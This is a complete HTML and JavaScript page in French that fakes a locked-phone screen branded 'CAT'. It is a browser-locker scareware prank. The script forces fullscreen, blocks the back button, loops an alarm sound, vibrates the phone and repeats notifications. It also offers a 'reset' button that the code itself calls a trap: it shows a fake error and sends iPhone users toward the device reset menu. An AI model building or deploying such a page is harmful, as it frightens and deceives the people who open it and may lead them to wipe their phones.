<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🔴 VERROUILLAGE</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Courier New', monospace;
            color: #ff3355;
            text-align: center;
            padding: 20px;
            overflow: hidden;
        }
        .overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .lock-icon { font-size: 5em; animation: pulse 0.5s infinite alternate; }
        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.7; }
            100% { transform: scale(1.2); opacity: 1; }
        }
        h1 { font-size: 2.5em; letter-spacing: 5px; margin: 20px 0; }
        .timer { font-size: 4em; font-weight: bold; color: #ff3355; text-shadow: 0 0 30px #ff3355; }
        .sub { color: #ff8888; font-size: 1.2em; margin: 10px 0; }
        .footer { color: #333; font-size: 0.7em; margin-top: 30px; }
        .btn-reset {
            background: #ff3355;
            color: #fff;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 1.2em;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn-reset:hover { background: #cc1133; }
    </style>
</head>
<body>

<div class="overlay" id="lockScreen">
    <div class="lock-icon">🔴</div>
    <h1>VERROUILLÉ</h1>
    <div class="timer" id="timer">30</div>
    <div class="sub">⏳ Redémarrage automatique dans...</div>
    <div style="color:#ff8888; font-size:0.9em; margin:10px 0;">🚨 Ne quittez pas cette page</div>
    <button class="btn-reset" onclick="resetTrap()">🔄 Réinitialiser (cache)</button>
    <div class="footer">🔒 Session CAT • 256-bit AES</div>
</div>

<script>
    // ---------- PLEIN ÉCRAN ----------
    document.documentElement.requestFullscreen().catch(() => {});

    // ---------- LAMPE TORCHE (Android / iOS via URL) ----------
    function toggleTorch() {
        if (navigator.userAgent.includes('Android')) {
            window.location.href = 'intent://flashlight/#Intent;action=android.media.action.STILL_IMAGE_CAMERA;end';
        } else if (navigator.userAgent.includes('iPhone')) {
            window.location.href = 'https://www.google.com/search?q=torche+iphone'; // fallback
        }
    }
    toggleTorch();

    // ---------- SON D'ALARME (Web Audio API) ----------
    function playAlarm() {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const gainNode = audioCtx.createGain();
            oscillator.connect(gainNode);
            gainNode.connect(audioCtx.destination);
            oscillator.frequency.value = 800;
            oscillator.type = 'square';
            gainNode.gain.value = 0.5;
            oscillator.start();
            setTimeout(() => {
                oscillator.frequency.value = 1000;
            }, 200);
            setTimeout(() => {
                oscillator.frequency.value = 600;
            }, 400);
            setTimeout(() => {
                oscillator.stop();
                // Rejouer après 2 secondes
                setTimeout(playAlarm, 2000);
            }, 600);
        } catch(e) { console.log('Alarme non supportée'); }
    }
    playAlarm();

    // ---------- COMPTE À REBOURS (boucle infinie) ----------
    let timeLeft = 30;
    const timerElement = document.getElementById('timer');

    const countdown = setInterval(() => {
        timeLeft--;
        timerElement.textContent = timeLeft;
        if (timeLeft <= 0) {
            timeLeft = 30; // reset
            // Vibration supplémentaire
            if (navigator.vibrate) {
                navigator.vibrate([500, 200, 500, 200, 1000]);
            }
            // Changement de couleur
            document.querySelector('.overlay').style.backgroundColor = '#1a0000';
            setTimeout(() => document.querySelector('.overlay').style.backgroundColor = 'rgba(0,0,0,0.95)', 300);
        }
    }, 1000);

    // ---------- BLOQUER LE BOUTON RETOUR ----------
    history.pushState(null, null, window.location.href);
    window.addEventListener('popstate', function(e) {
        history.pushState(null, null, window.location.href);
        // Réactivation du plein écran
        document.documentElement.requestFullscreen().catch(() => {});
    });

    // ---------- NOTIFICATIONS PUSH ----------
    if ('Notification' in window && Notification.permission === 'granted') {
        setInterval(() => {
            new Notification('🔴 ALERTE CAT', {
                body: 'Votre téléphone est verrouillé. Redémarrez.',
                icon: 'https://i.imgur.com/6o0kS.png'
            });
        }, 10000);
    } else if ('Notification' in window && Notification.permission === 'default') {
        Notification.requestPermission();
    }

    // ---------- FONCTION DE RÉINITIALISATION (fausse) ----------
    function resetTrap() {
        if (confirm('🔄 Voulez-vous vraiment réinitialiser ? (Cette action est irréversible)')) {
            alert('❌ Erreur : Réinitialisation impossible. Contactez CAT.');
            // Ouvre les paramètres pour les perdre
            if (navigator.userAgent.includes('Android')) {
                window.location.href = 'intent://settings/#Intent;action=android.settings.SETTINGS;end';
            } else if (navigator.userAgent.includes('iPhone')) {
                alert('Allez dans Réglages > Général > Réinitialiser.');
            }
        }
    }

    // ---------- CHANGEMENT DE TITRE ----------
    const titles = ['🔴 VERROUILLÉ', '⛔ ACCÈS REFUSÉ', '🐱 CAT', '⚠️ ALERTE'];
    let idx = 0;
    setInterval(() => {
        document.title = titles[idx % titles.length];
        idx++;
    }, 3000);

    console.log('🐱 CAT - Verrouillage total actif');
</script>
</body>
</html>
